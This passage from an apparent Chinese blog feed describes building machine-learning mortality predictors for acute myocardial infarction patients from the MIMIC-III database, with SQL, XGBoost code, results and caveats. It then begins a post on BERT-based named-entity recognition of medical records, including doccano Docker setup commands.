punctuation">)</span> MIN_VALUE<span class="token keyword">FROM</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span>CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID<span class="token punctuation">,</span>CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME<span class="token punctuation">,</span>CHARTEVENTS<span class="token punctuation">.</span><span class="token punctuation">`</span><span class="token keyword">VALUE</span><span class="token punctuation">`</span><span class="token punctuation">,</span>CHARTEVENTS<span class="token punctuation">.</span>VALUEUOM<span class="token punctuation">,</span>CHARTEVENTS<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span>TIMESTAMPDIFF<span class="token punctuation">(</span> <span class="token keyword">HOUR</span><span class="token punctuation">,</span> T<span class="token punctuation">.</span>INTIME<span class="token punctuation">,</span> CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME <span class="token punctuation">)</span> STAYHOUR <span class="token keyword">FROM</span>CHARTEVENTS<span class="token punctuation">,</span>A_AKF_DEATH T <span class="token keyword">WHERE</span>CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>ICUSTAY_ID <span class="token operator">AND</span> <span class="token punctuation">(</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">220546</span> <span class="token operator">OR</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">1542</span> <span class="token punctuation">)</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span>CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID <span class="token punctuation">)</span> AA<span class="token keyword">WHERE</span>STAYHOUR <span class="token operator">&lt;=</span> <span class="token number">24</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span>SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本次选取的急性心肌梗死患者主要特征见下表：</p><table><thead><tr class="header"><th>特征</th><th>字段或ITEMID</th></tr></thead><tbody><tr class="odd"><td>年龄</td><td>PTENETS.DOD和DOB</td></tr><tr class="even"><td>性别</td><td>PATIENTS.GENDER</td></tr><tr class="odd"><td>心率</td><td>CHARTEVENTS.ITEMID</td></tr><tr class="even"><td>入院类型</td><td>ADMISSION_TYPE</td></tr><tr class="odd"><td>ICD细分编码</td><td>ADMISSION.ICD9_CODE</td></tr><tr class="even"><td>最小GCS评分</td><td>220739、223901、223900、198</td></tr><tr class="odd"><td>排尿量</td><td>40055、226559</td></tr><tr class="even"><td>PaO2</td><td>779、220224</td></tr><tr class="odd"><td>白细胞计数WBC</td><td>220546、15424、200、1127、861</td></tr><tr class="even"><td>体温</td><td>676、223762、678、223761</td></tr><tr class="odd"><td>血钾浓度</td><td>50971</td></tr><tr class="even"><td>血钠浓度</td><td>50983</td></tr><tr class="odd"><td>血胆红素浓度</td><td>50885</td></tr><tr class="even"><td>是否有血液恶性肿瘤</td><td>ICD9_CODE =200XX-208XX</td></tr><tr class="odd"><td>收缩压</td><td>51、220050</td></tr><tr class="even"><td>动脉收缩压</td><td>455、220179</td></tr><tr class="odd"><td>血清尿素水平</td><td>51006</td></tr></tbody></table><h3 id="归一化和标准化">归一化和标准化</h3><p>为了将患者特征转换成便于机器学习模型输入训练的特征变量的形式，对于MIMIC数据库中患者初次入院24小时中多次测量并记录的化验指标，选取最小值、最大值和平均值作为三个不同的特征。</p><p>然后对数字变量进行归一化，把标准差置为1，均值置为零（ICD细分编码之类的虽然是数字，但实际上是一个类别特征，应作为类别特征处理）</p><p>对于性别种族等类别特征，进行Onehot编码转换为梯度提升树模型能够接受的类型；以性别为例，将性别为女编码为01，性别为男编码为10。（LightGBM等可以用直方图算法之类的方式直接处理类别特征，不需要该操作）经过上述处理，共筛选并构建出42个急性心肌梗死患者的特征维度。</p><h3 id="缺失值填补">缺失值填补</h3><p>由于MIMIC数据库中的数据是由两家不同的医院在10年间的ICU重症监护记录整合而成，急性心肌梗死患者的数据存在缺失和不统一的问题。以化验项目血清碳酸氢水平为例，在提取得到的4788份急性心肌梗死患者样本数据中，有4730份血清碳酸氢数据记录是完整的，有58份是缺失的，缺失率1.2%；但是部分检查指标，如收缩压，4788个样本中只有2665份完整数据，缺失率44.3%。</p><p>对于SVM等对于缺失值敏感的算法，用均值填补空缺数据的方法；对于缺失值不敏感的决策树类算法（如GBDT）和自带缺失值处理的算法（如XGBoost），将缺失值置为-1。</p><p>（缺失率在40%左右的会影响模型的效果，但是收缩压之类的又很重要，不能轻易舍弃）</p><figure><img src="/morality-prediction/image-20200603192151696.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="数据集不平衡的问题">数据集不平衡的问题</h3><p>有的疾病可能会有，急性心肌梗死由于死亡率很高，正负样本比例已经超过了1：9，并不是那种极端不平衡的问题。有的疾病死亡率1%左右需要采样等方式构造平衡数据集。</p><h2 id="模型训练">模型训练</h2><p>直接用的scikit-learn工具包，随便调了调参。决策树类的bsoosting算法表现都还不错，像GBDT啊，XGBoost啊，LightGBM啊。数据量还是有点小了，就没上深度学习那些网络。直接调sklearn的包调一下参：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># pd.options.mode.chained_assignment = None</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> lightgbm <span class="token keyword">as</span> lgb<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token punctuation">,</span>cross_val_score<span class="token punctuation">,</span>cross_val_predict<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>ensemble <span class="token keyword">import</span> RandomTreesEmbedding<span class="token punctuation">,</span> RandomForestClassifier<span class="token punctuation">,</span> GradientBoostingClassifier<span class="token comment"># criteria</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>metrics <span class="token keyword">import</span> accuracy_score<span class="token punctuation">,</span> roc_auc_score<span class="token punctuation">,</span> f1_score<span class="token punctuation">,</span>recall_score<span class="token punctuation">,</span> precision_score<span class="token punctuation">,</span> roc_curve<span class="token comment"># 加载数据</span>data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train_data_modified.csv'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>frac<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>data_x <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment"># data_x = data.iloc[:,[1,2,3,4,5,6,7,36]]</span>lbl <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>LabelEncoder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># data_x['M'] = lbl.fit_transform(data_x['M'].astype(str))#将含有字符的类别特征这一列进行转换</span><span class="token comment"># data_x['EMERGENCY'] = lbl.fit_transform(data_x['EMERGENCY'].astype(str))#将含有字符的类别特征这一列进行转换</span>data_y <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment"># 准备一个train/test来构建模型。</span>x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>data_x<span class="token punctuation">,</span>                                                    data_y<span class="token punctuation">,</span>                                                     test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>                                                     random_state<span class="token operator">=</span><span class="token number">52</span><span class="token punctuation">,</span>                                                    <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> x_test<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_test<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token keyword">from</span> xgboost<span class="token punctuation">.</span>sklearn <span class="token keyword">import</span> XGBClassifierxgb <span class="token operator">=</span> XGBClassifier<span class="token punctuation">(</span>    n_estimators<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>    learning_rate <span class="token operator">=</span><span class="token number">0.09</span><span class="token punctuation">,</span>    max_depth<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>    min_child_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>    gamma<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>    subsample<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>    colsample_bytree<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>    objective<span class="token operator">=</span> <span class="token string">'binary:logistic'</span><span class="token punctuation">,</span>    nthread<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>    scale_pos_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>    reg_lambda<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>    seed<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token comment"># xgb = HistGradientBoostingClassifier(learning_rate=0.09)</span>xgb<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span>y_pred_xgb <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>y_pred_xgb_pr <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict_proba<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>fpr_xgb<span class="token punctuation">,</span>tpr_xgb<span class="token punctuation">,</span>thresholds  <span class="token operator">=</span> roc_curve<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span>y_pred_xgb_pr<span class="token punctuation">)</span><span class="token comment"># y_pred_xgb = y_pred_xgb_pr > 0.5</span><span class="token comment"># print(lr.coef_) #W</span><span class="token comment"># print(lr.intercept_) #b</span><span class="token comment"># 评价指标</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"auc面积:"</span><span class="token punctuation">,</span>roc_auc_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb_pr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"精确率:"</span><span class="token punctuation">,</span>precision_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"召回率:"</span><span class="token punctuation">,</span>recall_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确率:"</span><span class="token punctuation">,</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F1值:"</span><span class="token punctuation">,</span>f1_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="死亡率预测">死亡率预测</h2><h3 id="结果">结果</h3><p>表3-3 几种机器学习方法的死亡率预测结果如下表：</p><table><thead><tr class="header"><th></th><th>GBDT</th><th>LR</th><th>KNN</th><th>SVM</th><th>XGBoost</th><th>LightGBM</th><th>NB</th></tr></thead><tbody><tr class="odd"><td>AUC</td><td>0.834</td><td>0.780</td><td>0.695</td><td>0.779</td><td>0.851</td><td>0.844</td><td>0.777</td></tr><tr class="even"><td>精确率</td><td>0.676</td><td>0.618</td><td>0.5</td><td>0.688</td><td>0.690</td><td>0.663</td><td>0.378</td></tr><tr class="odd"><td>召回率</td><td>0.320</td><td>0.239</td><td>0.162</td><td>0.155</td><td>0.329</td><td>0.330</td><td>0.479</td></tr><tr class="even"><td>准确率</td><td>0.879</td><td>0.865</td><td>0.852</td><td>0.864</td><td>0.875</td><td>0.872</td><td>0.806</td></tr><tr class="odd"><td>F1 值</td><td>0.451</td><td>0.345</td><td>0.245</td><td>0.253</td><td>0.443</td><td>0.439</td><td>0.422</td></tr></tbody></table><p>看上去准确率挺高，实际结果不太好，召回率太低了。召回率的意义是真阳性率（True Positive Rate），也就是预测到的死亡患者占所有患者的比例，大概真正死亡的患者只有一半被预测了出来。</p><table><thead><tr class="header"><th></th><th>实际死亡</th><th>实际存活</th></tr></thead><tbody><tr class="odd"><td>预测死亡</td><td>真阳性（TP）</td><td>假阳性（FP）</td></tr><tr class="even"><td>预测存活</td><td>假阴性（FN）</td><td>真阴性（TN）</td></tr></tbody></table><p>由于数据集还是太小，就没有细分搞成多分类的问题预测一下短期（30天）和长期（90天以上）死亡率，数据集大了可以做一下。数据集再大可以做细分，比如STEMI和NSTEMI的细分或者</p><h3 id="roc曲线">ROC曲线</h3><figure><img src="/morality-prediction/image-20200531203632378.png" alt="几种机器学习方法的ROC曲线" /><figcaption aria-hidden="true">几种机器学习方法的ROC曲线</figcaption></figure><h3 id="特征权重">特征权重</h3><p>以GBDT为例，提取训练模型的决策树权重，结果如图3-3所示。由图可知，梯度提升树模型认为最重要的10个指标为当日最小血清碳酸氢水平、平均动脉血二氧化碳分压、平均排尿量、心率范围、最小心率、肌酐、体温范围、当日最大收缩压、当日心率标准差、年龄。</p><figure><img src="/morality-prediction/image-20200531210528257.png" alt="GBDT的特征权重" /><figcaption aria-hidden="true">GBDT的特征权重</figcaption></figure><h2 id="其他问题">其他问题</h2><p>这个，急性心肌梗死这个直接看心电图或者彩超啥的更好一些，准确率一般不会低于90%。心血管疾病这种做这个预测基本没有太大意义。急性肾衰竭啥的可能更有意义一点</p><p>MIMIC数据库里面的数据亚裔很少，放到国内可能不太合适。护理和临床记录方式也差别不小。</p><p>这是2001-2012年的数据，近十年来医学水平提高了不少，包括再灌注等手段，死亡率已经下降了，用这批数据预测现在的可能会偏高</p><h2 id="补充说明">补充说明</h2><h3 id="mimic数据库表格名称及用途">MIMIC数据库表格名称及用途</h3><table><colgroup><col style="width: 20%" /><col style="width: 53%" /><col style="width: 26%" /></colgroup><thead><tr class="header"><th>表格名称</th><th>表格内容</th><th>备注</th></tr></thead><tbody><tr class="odd"><td>ADMISSIONS（入院表）</td><td>提供有关患者的入院信息，由于为病人进行的每次唯一的医院访问都分配了一个唯一的信息<code>HADM_ID</code>，因此ADMISSIONS表可以被认为是<code>HADM_ID</code></td><td></td></tr><tr class="even"><td>CALLOUT(标注表)</td><td>提供患者何时准备好从ICU出院以及患者何时实际从ICU出院的信息</td><td></td></tr><tr class="odd"><td>caregivers</td><td>记录医护人员信息（ID、类型、附加信息）</td><td></td></tr><tr class="even"><td>chartevents</td><td>记录所有病人的图表数据，住院期间的所有症状、体征、精神状态、实验室检查等</td><td></td></tr><tr class="odd"><td>cptevents</td><td>包含当前的程序术语（CPT）代码，这些代码便于为在患者身上执行的操作计费。</td><td></td></tr><tr class="even"><td>d_cpt</td><td>当前程序术语（CPT）代码的高级定义</td><td></td></tr><tr class="odd"><td>prescriptions（处方）</td><td>包含药物相关的订单条目，即处方</td><td></td></tr><tr class="even"><td>inputevents_cv</td><td>患者输入数据（流入患者体内液体信息）</td><td>表格来源CareVue ICU数据库。</td></tr><tr class="odd"><td>inputeevents_mv</td><td>患者输入数据（流入患者体内液体信息）</td><td>表格来源Metavision ICU数据库。</td></tr><tr class="even"><td>outputevent</td><td>患者的输出数据。</td><td></td></tr><tr class="odd"><td>labevents</td><td>包含给定患者的所有实验室测量值，包括患者数据（ITEMID、VALUE）</td><td></td></tr><tr class="even"><td>d_icd_diagnoses</td><td>ICD-9疾病诊断的定义表,对 疾病编码的解释</td><td></td></tr><tr class="odd"><td>d_icd_procedures</td><td>ICD-9治疗程序代码的解释</td><td></td></tr><tr class="even"><td>d_items</td><td>ICU数据库中所有项目的定义表</td><td></td></tr><tr class="odd"><td>d_labitems</td><td>所有实验室测量的定义表（对ITEMID的解释，对应数据类型，关联的LOINC代码）</td><td></td></tr><tr class="even"><td>datetimeevents</td><td>包含所有日期格式的数据</td><td></td></tr><tr class="odd"><td>diagnoses_icd（诊断表）</td><td>包含患者住院期间所有ICD-9诊断</td><td></td></tr><tr class="even"><td>drgcodes</td><td>包含患者的诊断相关组（DRG）代码</td><td></td></tr><tr class="odd"><td>icustays</td><td>患者在ICU内的住院概要（入住或者转出ICU的时间等）</td><td></td></tr><tr class="even"><td>microbiologyevents</td><td>包含微生物学信息，包括进行的测试和敏感性</td><td></td></tr><tr class="odd"><td>noteevents</td><td>包含所有患者注意事项。，主要是不便于数字化的报告</td><td></td></tr><tr class="even"><td>patients</td><td>包含患者的基本信息（性别、出生日期、死亡日期、死亡标志位）</td><td></td></tr><tr class="odd"><td>procedureevents_mv</td><td>包含患者的（治疗）程序</td><td></td></tr><tr class="even"><td>procedures_icd</td><td>包含患者的ICD程序，最值得注意的是ICD-9程序，即诊断程序</td><td></td></tr><tr class="odd"><td>services</td><td>患者被接纳/转移的服务</td><td></td></tr><tr class="even"><td>transfers</td><td>患者整个住院期间的物理位置</td><td></td></tr></tbody></table><p>注意： 表格主要分为两种，一种是以D开头的，表示该表格为字典，比如d_labitems，表示实验室检查字典，内含每个实验室检查结果的说明；没有以D打头的表格则是记录患者信息的表格，比如labevents则表示患者住院期间的所有实验室检查结果。</p><h3 id="mimic数据表中主要字段">MIMIC数据表中主要字段</h3><table><thead><tr class="header"><th>数据表</th><th>字段</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>ADMISSION</td><td>SUBJECT_ID</td><td>每个患者的唯一标识</td></tr><tr class="even"><td>ADMISSION</td><td>HADM_ID</td><td>患者每次入院的唯一标识</td></tr><tr class="odd"><td>ADMISSION</td><td>ADMITTIME</td><td>入院时间</td></tr><tr class="even"><td>ADMISSION</td><td>DEATHTIME</td><td>死亡时间</td></tr><tr class="odd"><td>DIAGNOSES_ICD</td><td>ICD9_CODES</td><td>患者的ICD-9编码</td></tr><tr class="even"><td>ADMISSION</td><td>HOSPITAL_EXPIRE_FLAG</td><td>是否死亡</td></tr><tr class="odd"><td>D_ITEMS</td><td>ITEMID</td><td>项目编号</td></tr><tr class="even"><td>D_ITEMS</td><td>LEABEL</td><td>项目名称</td></tr><tr class="odd"><td>ICUSTAYS</td><td>ICUSTAY_ID</td><td>每次ICU病房接受病人唯一标识</td></tr><tr class="even"><td>LABEVENTS</td><td>VALUE</td><td>检查项目</td></tr><tr class="odd"><td>LABEVENTS</td><td>VALUEUOM</td><td>ITEM的值 检查项目的单位（如K/uL）</td></tr><tr class="even"><td>LABEVENT</td><td>FLAG</td><td>检查项目是否异常（正常为Null）</td></tr></tbody></table><h3 id="急性心肌梗死患者主要特征">急性心肌梗死患者主要特征</h3><table><thead><tr class="header"><th>特征</th><th>字段或ITEMID</th></tr></thead><tbody><tr class="odd"><td>年龄</td><td>PTENETS.DOD和DOB</td></tr><tr class="even"><td>性别</td><td>PATIENTS.GENDER</td></tr><tr class="odd"><td>心率</td><td>CHARTEVENTS.ITEMID</td></tr><tr class="even"><td>入院类型</td><td>ADMISSION_TYPE</td></tr><tr class="odd"><td>ICD细分编码</td><td>ADMISSION.ICD9_CODE</td></tr><tr class="even"><td>最小GCS评分</td><td>220739、223901、223900、198</td></tr><tr class="odd"><td>排尿量</td><td>40055、226559</td></tr><tr class="even"><td>PaO2</td><td>779、220224</td></tr><tr class="odd"><td>白细胞计数WBC</td><td>220546、15424、200、1127、861</td></tr><tr class="even"><td>体温</td><td>676、223762、678、223761</td></tr><tr class="odd"><td>血钾浓度</td><td>50971</td></tr><tr class="even"><td>血钠浓度</td><td>50983</td></tr><tr class="odd"><td>血胆红素浓度</td><td>50885</td></tr><tr class="even"><td>是否有血液恶性肿瘤</td><td>ICD9_CODE =200XX-208XX</td></tr><tr class="odd"><td>收缩压</td><td>51、220050</td></tr><tr class="even"><td>动脉收缩压</td><td>455、220179</td></tr><tr class="odd"><td>血清尿素水平</td><td>51006</td></tr></tbody></table><h3 id="注意事项">注意事项</h3><ul><li>MIMIC IIII 数据库中用于识别患者身份的字段共有3个：subjects_id，hadm_id和icustay_id。其中subjects_id是患者身份的唯一标识，即一个subject_id只对应一名患者，一名患者也只有一个subject_id。hadm_id是患者每次住院的身份识别号，一个患者可能多次住院，因此一个subjects_id会对应多个hadm_id，但一个hadm_id只能对应一个subject_id。icustay_id表示患者在进入ICU的编号，因为患者一次住院可以多次进入不同的ICU，因此一个icustay_id只能对应一个hadm_id，当然也只能对应一个subject_id，但一个hadm_id可以对应多个icustay_id。在利用 MIMIC III 数据库进行研究时，往往需要运用sql语言对多个数据库进行连接，连接的基础一般就是这三个字段。</li><li>患者的临床资料不一定是住ICU期间的临床资料，也可能是住普通病房时的资料。记录患者入院时间的表格为admission，内含三个时间点：admittime，表示患者入院时间；dischartime，表示患者出院时间；deathtime，表示患者院内死亡的时间。如果deathtime为空(null)，则表示患者住院期间未死亡。记录患者进入和离开ICU的表格为icustays，这个表格中有两个时间较为重要，分别是intime和outtime，前者表示进入ICU的时间，后者表示离开ICU的时间。当然，如果患者在ICU死亡，那么dischartime、outtime和deathtime理论上就是同一个时间，但实际上会稍微有些出入，估计是由于录入不及时造成的；</li><li>MIMIC III 中的数据来自于两套数据采集系统：carevue和metavision。在icustays表格中，有一个字段叫dbsource，用于标识数据是来源于carevue还是metavision。CareVue记录的是2001至2008年入院的患者资料，Metavision则是2008至2012年期间入院的患者资料。在Metavision中，病人的随访时间最少为90天，在CareVue中，病人的随访时间则至少为4年。换而言之，在进行预后研究时，如果将数据来源限定为CareVue，则可以将随访时间假定为4年，对于4年以后死亡的患者，可以将其在出院后第4年生存状况定义为“存活”。当然，如果患者的死亡状况(DOD_SSN)为空格(null)，也同样可以表明患者在出院后4年仍然存活。</li><li>MIMIC数据库中的ICD编码统计方式和国内不太一样，基本都包含并发症，比如一个病人流感入院并死亡，同时患有急性心肌梗死的并发症，那么该病人也算作急性心肌梗死患者。（主要诊断是其他的疾病，但同时患有某疾病并发症，也认为是该疾病患者，统计死亡时也算在里面）</li><li>在MIMIC中有一个'ADMISSION_TYPE，其中有3个类别，分别是URGENT，EMERGENCY和ELECTIVE，ELECTIVE是不紧急的，URGENT和EMERGENCY的区别大概是URGENT的紧急程度更高（一般是需要立即采取措施的那种）</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;以急性心肌梗死和MIMIC数据库为例&lt;/p&gt;</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="MIMIC" scheme="https://zhangjk98.xyz/tags/MIMIC/"/>
    
  </entry>
  
  <entry>
    <title>使用BERT进行电子病历的命名实体识别</title>
    <link href="https://zhangjk98.xyz/9112/"/>
    <id>https://zhangjk98.xyz/9112/</id>
    <published>2020-05-19T02:09:16.000Z</published>
    <updated>2020-05-19T02:09:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>BERT效果确实好，就是有点吃内存</p><a id="more"></a><h2 id="序列标注">序列标注</h2><p>一些医院的电子病历拆分的很细，比如主诉这一个大项里面部位、症状、时间、状态都是分开的；另一些医院的电子病历就跟纯文本差不多，要把大段文字中的主要结构提出来需要自然语言处理或者人工录入。一般做自然语言处理的时候都是几个部分分开做的，因为不同部分差异比较大，分开训练识别效果好。大部分电子病历包括入院记录、首次病程记录、病程记录、出院记录、手术记录、护理记录、病案首页，这里面又分为一些检查项、时间、主诉、既往史之类的小项。不少电子病历系统导出都是XML的，一般都是把电子病历拆成主诉那种一个个不能再拆的纯文本部分，比如主诉，见<a href="https://zhangjk98.xyz/81d4/">上一篇</a>，然后再对不能拆分的纯文本用人工或自然语言处理进一步拆分。这就是所谓的电子病历结构化。</p><p>比如一段主诉：</p><blockquote><p>反复胸痛伴胸闷1+年，加重20+天。</p></blockquote><p>按照规范一定的规范可分为几个不同的小块，比如下面这十一种：</p><blockquote><p>部位、症状、持续时间、伴随部位、伴随症状、伴随时间、状 态、病因/其他、观察项目、观察结果、既往史</p></blockquote><p>胸是部位、痛是症状、1+年是持续时间、反复是状态......</p><p>标注出来的结果可以保存为json格式，labels里面的list分别为起始位置、结束位置、标签</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;text&quot;: &quot;反复胸痛伴胸闷1+年，加重20+天。&quot;, &quot;labels&quot;: [[0, 2, &quot;状态&quot;], [2, 3, &quot;部位&quot;], [3, 4, &quot;症状&quot;], [5, 7, &quot;伴随症状&quot;], [7, 10, &quot;伴随时间&quot;], [11, 17, &quot;持续时间&quot;]]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>BIO格式，大概是这个样子：B，begin标签开始；I，inside包含在标签内，O，outside在标签外</p><pre class="line-numbers language-none"><code class="language-none">反 B-状态复 I-状态胸 B-部位痛 B-症状伴 O胸 B-伴随症状闷 I-伴随症状1 B-伴随时间+ I-伴随时间年 I-伴随时间， O加 B-持续时间重 I-持续时间2 I-持续时间0 I-持续时间+ I-持续时间天 I-持续时间。 O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BERT的接口是BIO格式，标注工具doccano，这里写两个互相转换的脚本就行了，标注完成后将json转为BIO，训练和预测完成后将BIO预测结果转为JSON</p><h2 id="训练模型">训练模型</h2><p>NLP里面的命名实体识别很早就用在电子病历上，早期的机器学习方法效果一般，后来开始用RNN和CNN，后来用LSTM，再后来用BERT，效果一直在提升，BERT基本上到顶了（好一点的训练数据BERT基本能达到90%以上，对于主诉这样的较短的简单条目甚至能达到98%以上）</p><h2 id="其他杂项">其他杂项</h2><h3 id="doccano的部署和使用">doccano的部署和使用</h3><h4 id="部署">部署</h4><h5 id="docker方式">Docker方式</h5><h6 id="构建和部署">构建和部署</h6><p>运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">$ docker pull chakkiworks&#x2F;doccano # 拉取官方镜像$ docker run -d --name doccano -p 80:8000 